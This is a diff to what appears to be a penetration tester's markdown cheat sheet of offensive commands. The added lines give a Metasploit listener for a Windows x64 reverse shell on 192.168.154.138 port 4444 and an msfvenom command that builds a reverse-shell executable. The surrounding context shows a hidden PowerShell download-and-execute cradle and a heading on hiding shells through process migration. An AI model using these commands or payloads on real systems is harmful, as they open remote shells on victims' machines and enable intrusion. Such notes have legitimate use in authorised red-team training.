@@ -2,6 +2,9 @@
 common metasploit listener:
 ```bash
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT <PORT>; set ExitOnSession false; exploit -j"
+
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 192.168.154.138; set LPORT 4444; set ExitOnSession false; exploit -j"
+
 ```
 
 
@@ -68,6 +71,12 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebCli
 having cmd shell upgrade tty shell:
 ```bash
 powershell.exe -NoLogo -NoExit -Command "$Host.UI.RawUI.WindowTitle = 'Upgraded Shell';"
+```
+
+
+single payload :
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.154.138 LPORT=4444 -f exe -o reverse.exe  
 ```
 
 Hiding Shell with Prepend Migrate using Msfvenom:
